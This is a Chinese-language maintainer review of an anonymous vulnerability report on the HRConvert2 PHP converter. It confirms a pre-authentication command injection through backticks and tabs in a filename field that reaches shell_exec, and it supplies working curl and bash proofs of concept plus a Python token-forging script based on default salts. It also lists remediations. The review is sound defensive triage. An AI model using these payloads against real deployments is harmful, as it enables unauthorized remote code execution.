# HRConvert2 匿名漏洞报告复核（维护者视角）

复核日期：2026-04-08  
复核对象：`./reports/漏洞分析报告_前认证RCE_认证绕过后RCE.md`  
复核范围：前认证RCE、认证绕过后RCE、过滤可绕过性、默认配置可触发性、`./漏洞信息` 报告质量

## 1. 复核结论（先给结论）

- 结论A：**前认证RCE风险成立**（高置信）。
- 结论B：匿名报告中“缺失 Token2 即可绕过”这一点**不成立**（代码级反证）。
- 结论C：若将 Token 机制视作“鉴权”，则存在“弱鉴权后RCE”风险：任意未登录用户可先拿到合法 token，再触发危险链路；默认盐值不变时还可离线伪造 token。
- 结论D：默认配置部署下可触发（依赖项目要求安装的外部转换工具存在，且 `shell_exec` 未禁用）。

## 2. 审核方法（技能流程）

本次按 `vuln-hunt-memory-driven` 的核心步骤执行：
- 攻击面锁定：确认 Web 实际入口、POST 路由、执行门禁。
- 漏洞狩猎：从 `source -> sanitize -> sink(shell_exec)` 建调用链。
- 可利用性验证：逐条验证过滤、门禁、默认配置、可达性。
- 报告产出：明确“成立/不成立/条件成立”的边界。

说明：当前工作机未安装 PHP 运行时（`php` 命令不可用），因此本次为**源码级可达性复核**，未进行在线动态打点。

## 3. 实际 Web 路由可达性复核

### 3.1 入口路由

`index.html` 直接跳转到 `convertCore.php`：

```html
<!-- index.html:12-14 -->
if (screen.width <= 699) { document.location = "/HRProprietary/HRConvert2/convertCore.php"; }
if (screen.width >= 700) { document.location = "/HRProprietary/HRConvert2/convertCore.php"; }
```

UI 页面中，上传与转换均发往同一路由：

```php
// UI/Default/convertGui1.php:179-181
<form action='convertCore.php' ... enctype='multipart/form-data'>
<input type='hidden' name='Token1' ...>
<input type='hidden' name='Token2' ...>
```

```php
// UI/Default/convertGui2.php:666-672
url: 'convertCore.php',
Token1:..., Token2:...,
convertSelected:'<?php echo $File; ?>',
extension:..., userconvertfilename:...
```

### 3.2 服务端门禁位置

危险操作只在 `if ($TokensAreValid)` 中执行：

```php
// convertCore.php:2181-2218
if ($TokensAreValid) {
  if ($TokensAreValid && !empty($_FILES)) uploadFiles();
  ...
  if (isset($_POST['convertSelected'])) convertFiles(...);
}
```

## 4. 前认证RCE复核（成立）

### 4.1 利用链（函数级）

1) 参数输入与初步清洗

```php
// convertCore.php:292,294
if (isset($_POST['userconvertfilename'])) sanitize(..., TRUE);
if (isset($_POST['convertSelected'])) sanitize(..., TRUE);
```

2) 文件上传（攻击者可控文件名进入工作目录）

```php
// convertCore.php:1337-1356 (uploadFiles)
foreach ($_FILES['file']['name'] as $file) {
  list ($file, ...) = sanitize($file, TRUE);
  ...
  @copy($_FILES['file']['tmp_name'], $f1);
}
```

3) 转换前路径拼接（包含用户可控输出文件名）

```php
// convertCore.php:1262 (verifyFile)
list ($NewPathname, ...) = sanitize($ConvertDir.$UserFilename.'.'.$UserExtension, FALSE);
```

4) 进入命令执行 sink

```php
// convertCore.php:1044 (convertAudio)
$returnData = shell_exec('ffmpeg -y -i '.$pathname.$ext.$br.$newPathname);
```

同类 `shell_exec` sink 还广泛存在于 `convertImages/convertDocuments/convertArchives/ocrFiles` 等路径（`convertCore.php` 内多处）。

### 4.2 过滤与绕过

核心过滤：

```php
// convertCore.php:68-69
if ($strict) ... str_replace(str_split('|\\~#[](){};:$!#^&%@>*<"\'/'), '', $Variable)
if (!$strict) ... str_replace(str_split('|\\[](){};"\''), '', $Variable)
```

复核要点：
- **未过滤反引号 `**（命令替换关键字符）。
- 仅替换普通空格 `' '`，**不处理制表符/换行**。
- sink 未使用 `escapeshellarg()`，而是直接拼接命令字符串。

可行绕过方式：
- `` userconvertfilename=out `whoami` ``（无需空格）；
- 或 ``userconvertfilename=out`touch<TAB>pwned` ``（使用 Tab 分隔参数）。

### 4.3 攻击者视角的 HTTP 触发链

通用链（不依赖已知盐值）：
1. `GET /HRProprietary/HRConvert2/convertCore.php`，从返回 HTML 隐藏域拿 `Token1/Token2`。  
2. `POST /.../convertCore.php` 上传允许扩展名文件（如 `sample.mp3`）。  
3. ``POST /.../convertCore.php` 提交 `convertSelected + extension + userconvertfilename=out`whoami` ``，进入 `convertFiles -> convertAudio -> shell_exec`。

变体链（部署未改默认盐值）：
- 可离线计算 `Token2 = ripemd160(Token1 + Salts1..6)`（`convertCore.php:255-256`, `Resources/config.php:42-47`），无需先 GET 页面。

### 4.4 详细 PoC（可复核步骤）

仅用于授权自测。以下示例假设目标是本地 Docker：`http://127.0.0.1:8080`。

#### PoC-A：从真实页面拿 token 后触发前认证 RCE（time-based）

1) 准备目标与测试文件

```bash
TARGET="http://127.0.0.1:8080/HRProprietary/HRConvert2/convertCore.php"
printf 'ID3' > sample.mp3
```

2) 获取页面中生成的合法 Token（与真实路由一致）

```bash
PAGE="$(curl -s "$TARGET")"
TOKEN1="$(printf '%s' "$PAGE" | sed -n "s/.*name='Token1' value='\([^']*\)'.*/\1/p" | head -n1)"
TOKEN2="$(printf '%s' "$PAGE" | sed -n "s/.*name='Token2' value='\([^']*\)'.*/\1/p" | head -n1)"
echo "TOKEN1=${TOKEN1:0:12}..."
echo "TOKEN2=${TOKEN2:0:12}..."
```

3) 上传可转换文件（走真实上传路由）

```bash
curl -sS -X POST "$TARGET" \
  -F "Token1=$TOKEN1" \
  -F "Token2=$TOKEN2" \
  -F "file=@sample.mp3;filename=sample.mp3" >/dev/null
```

4) 先发一个基线转换请求（无 payload）

```bash
time curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=sample.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode "userconvertfilename=baseline_out" >/dev/null
```

5) 发送注入请求（关键：反引号 + Tab）

```bash
time curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=sample.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode $'userconvertfilename=poc`sleep\t8`' >/dev/null
```

预期结果：
- 第 5 步相比第 4 步出现约 8 秒额外延迟，说明反引号内命令被 shell 执行（blind RCE 证据）。
- 该链路直接对应 `convertCore.php:2216 -> 1539 -> 1580 -> 1598 -> 1044(shell_exec)`。

#### PoC-B：默认盐值下离线伪造 Token 后触发（弱鉴权变体）

1) 离线计算一组可用 token（默认配置未改盐值前提）

```bash
python3 - <<'PY'
import hashlib
token1 = "A" * 20
salts = [
    "something1SoRa21nDoMThatNobody_4Wiljl_evar+guess+i1tgdgdfgfdsfgdasfdas",
    "gdf4sgdfsg1sdfsomethingSoRa33nDoMThatNobody_Will2_evar_guess+it",
    "somethingSoRanDoMThatNobo423432dy54534534_Will_evar+guess+it",
    "somethin1gSoRanDoMThat123:l_will_evar-guess+it",
    "somethingSoRanDoMThatNobodyr3454r3r33_Will_evar+guess+it",
    "somethingSoR5anDoMThatNob2odyawryoglukfgy;/,6^&__Will_evar+guess+it",
]
token2 = hashlib.new("ripemd160", (token1 + "".join(salts)).encode()).hexdigest()
print(token1)
print(token2)
PY
```

2) 用这组 token 直接执行 PoC-A 的第 3~5 步（跳过取 token 页面步骤）。

预期结果：
- 仍可进入转换与命令注入链。
- 说明 token 不具备真正认证强度，更多是可计算的请求参数校验。

#### PoC-C：反证（缺失 Token2 不能直接通过）

1) 仅提交 Token1，尝试上传：

```bash
curl -sS -X POST "$TARGET" \
  -F "Token1=$TOKEN1" \
  -F "file=@sample.mp3;filename=no_token2.mp3" >/dev/null
```

2) 再带完整 token 试图转换 `no_token2.mp3`：

```bash
curl -sS -X POST "$TARGET" \
  --data-urlencode "Token1=$TOKEN1" \
  --data-urlencode "Token2=$TOKEN2" \
  --data-urlencode "convertSelected=no_token2.mp3" \
  --data-urlencode "extension=mp3" \
  --data-urlencode "userconvertfilename=check_no_token2"
```

预期结果：
- 第 1 步上传未生效，第 2 步转换失败（文件不存在/校验失败）。
- 与代码一致：`verifyInputs()` 先将 `$Token2` 置空串，`verifyTokens()` 中 `isset($Token2)` 为真且与 hash 不匹配，`$TokensAreValid` 变为 `FALSE`。

## 5. “认证绕过后RCE”复核（需修正）

### 5.1 匿名报告中不成立点

匿名报告称“缺失 Token2 可直接绕过”。对照代码，这一点不成立：

```php
// convertCore.php:266
$Token1 = $Token2 = '';

// convertCore.php:279-280
if (isset($_POST['Token1'])) ...
if (isset($_POST['Token2'])) ...
```

即使请求里不传 `Token2`，`verifyInputs()` 返回给 `verifyTokens()` 的 `$Token2` 也是空串 `''`（已设置变量）。

```php
// convertCore.php:255
if (isset($Token2)) if ($Token2 !== hash(...)) $TokensAreValid = FALSE;
```

因此“缺失 Token2 直接通过”与当前代码逻辑矛盾。

### 5.2 修正后的真实风险

虽然“缺失 Token2 直过”不成立，但该 Token 机制不能构成真实认证边界：
- 任意匿名用户可先 GET 页面，拿到合法 token（`UI/Default/convertGui1.php:180-181`）。
- Token 不绑定服务端会话状态，若盐值默认可知还可离线伪造。

所以应表述为：**“弱鉴权机制下的前认证RCE”**，而不是严格意义上的“先绕过强认证再RCE”。

## 6. 默认配置可触发性

默认配置声明“无认证面向浏览器用户”：

```php
// Resources/config.php:11-13
// ... without authentication.
```

默认开启大量转换类型：

```php
// Resources/config.php:242
$SupportedConversionTypes = array('Document', 'Image', 'Model', 'Drawing', 'Video', 'Subtitle', 'Audio', 'Archive', 'Stream', 'OCR');
```

在满足项目自述依赖（ffmpeg/unoconv/imagemagick 等）且 `shell_exec` 可用时，攻击链可触发。

## 7. 对 `./漏洞信息` 报告效果评估

### 7.1 有效点

- 能发现高风险函数附近的“输入清洗/上传/命令执行”热点（覆盖面较广）。
- 两份 PDF 的首屏统计能提示重点文件：
  - `2041455675347034114.pdf`：`convertCore.php` 方向，标记 `2`。
  - `2041455794591096833.pdf`：`ScanCore.php` 方向，标记 `129`。

### 7.2 不足点

- 重复命中较多，语句级噪声高，缺少 exploitability 分层。
- 对“真实门禁语义”判断不足（如 Token 初始化细节导致的误判风险）。
- 未给出完整路由级触发链（从 HTTP 请求到具体 sink 的可执行步骤）。

### 7.3 结论

`./漏洞信息` 更适合作为**线索来源**，不应直接当作“可利用性结论”。需要结合源码级路由与门禁逻辑复核。

## 8. 修复建议（按优先级）

1. 立即修复：所有 `shell_exec` 参数使用 `escapeshellarg()`，禁止直接拼接。  
2. 立即修复：过滤规则补齐反引号和控制字符；但过滤不能替代命令参数转义。  
3. 架构修复：引入真实身份认证，不要把 `Token1/Token2` 当权限控制。  
4. 机制修复：Token 绑定服务端会话并设置时效/一次性，缺失或空值直接拒绝。  
5. 验证回归：对上传->转换->OCR->扫描所有路径增加安全单元测试与集成测试。

## 9. 对匿名报告的最终判定

- “前认证RCE”判定：**成立**。  
- “认证绕过后RCE”判定：**部分成立（需改写为弱鉴权/可获取token后RCE）**。  
- “Token2 缺失可直过”判定：**不成立（已代码反证）**。
